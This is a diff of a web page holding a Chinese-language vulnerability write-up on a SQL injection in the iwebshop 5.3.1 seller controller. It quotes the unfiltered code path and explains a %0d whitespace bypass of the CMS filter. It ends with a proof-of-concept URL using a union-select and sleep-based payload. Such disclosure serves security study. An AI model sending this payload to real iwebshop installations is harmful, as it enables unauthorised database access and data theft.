@@ -128,15 +128,20 @@ if (!doNotTrack) {
                         </div>
 
                         <div id="readme" class="Box-body readme blob instapaper_body js-code-block-container">
-                            <article class="markdown-body entry-content p-3 p-md-6" itemprop="text"><h3 id="iwebshop-531-">iwebshop 最新版本5.3.1 前台注入</h3>
+                            <article class="markdown-body entry-content p-3 p-md-6" itemprop="text"><h3 id="iwebshop-最新版本5-3-1-前台注入">iwebshop 最新版本5.3.1 前台注入</h3>
+
 <p>iwebshop最新版存在一个非常弱智的注入漏洞</p>
+
 <p>主要导致原因 <code>$id        = IFilter::act(IReq::get('id'));</code></p>
+
 <p>开发者忘记写成 <code>IFilter::act(IReq::get('id'), 'int')</code>了,导致直接注入. 在其他文件也存在这个问题.</p>
+
 <p>这个文件需要商家账号才可以访问,是可以注册的</p>
+
 <p>漏洞点 <code>controllers/seller.php</code> 函数<code>categoryAjax</code></p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre class="chroma"><code class="language-php" data-lang="php"><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -154,17 +159,18 @@ if (!doNotTrack) {
     {
         $id        = IFilter::act(IReq::get(&#39;id&#39;));
         $parent_id = IFilter::act(IReq::get(&#39;parent_id&#39;));
-        if($id <span class="err">&amp;</span><span class="err">&amp;</span> is_array($id))
+        if($id <span class="err">&amp;&amp;</span> is_array($id))
         {
             foreach($id as $category_id)
             {
                 $childString = goods_class::catChild($category_id);//父类ID不能死循环设置成其子分类
-                if($parent_id &gt; 0 <span class="err">&amp;</span><span class="err">&amp;</span> stripos(&#34;,&#34;.$childString.&#34;,&#34;,&#34;,&#34;.$parent_id.&#34;,&#34;) !== false)
+                if($parent_id &gt; 0 <span class="err">&amp;&amp;</span> stripos(&#34;,&#34;.$childString.&#34;,&#34;,&#34;,&#34;.$parent_id.&#34;,&#34;) !== false)
                 {                    die(JSON::encode(array(&#39;result&#39; =&gt; &#39;fail&#39;)));                }
-            }
-</code></pre></td></tr></table>
+            }</code></pre></td></tr></table>
 </div>
-</div><p>直接将id传入到<code>catChild</code></p>
+</div>
+<p>直接将id传入到<code>catChild</code></p>
+
 <pre><code> public static function catChild($catId,$level = 1)
     {        if($level == 0)        {
             return $catId;
@@ -180,8 +186,12 @@ if (!doNotTrack) {
                 break;
             }
             $temp = $catDB-&gt;query('parent_id = '.$id);
-</code></pre><p>直接将id拼接到sql查询中.. 这个cms有一点sql过滤,但是非常弱,也就ctf入门题的水平</p>
+</code></pre>
+
+<p>直接将id拼接到sql查询中.. 这个cms有一点sql过滤,但是非常弱,也就ctf入门题的水平</p>
+
 <p><code>lib/core/util/filter_class.php</code></p>
+
 <pre><code>   public static function string($str,$limitLen = false)
     {
         $str = trim($str);
@@ -204,8 +214,12 @@ if (!doNotTrack) {
         return self::removeEmoji($str);
     }
 
-</code></pre><p>不允许<code>union </code>加空格,可是空格的代替很多 比如 <code>%0d</code></p>
+</code></pre>
+
+<p>不允许<code>union</code>加空格,可是空格的代替很多 比如 <code>%0d</code></p>
+
 <p>poc</p>
+
 <pre><code>/index.php?controller=seller&amp;action=categoryAjax&amp;id[]=1%20and%201=1%20union%0dselect%0d1,2,3,4,5,6,7,8,sleep(5)
 
 </code></pre></article>
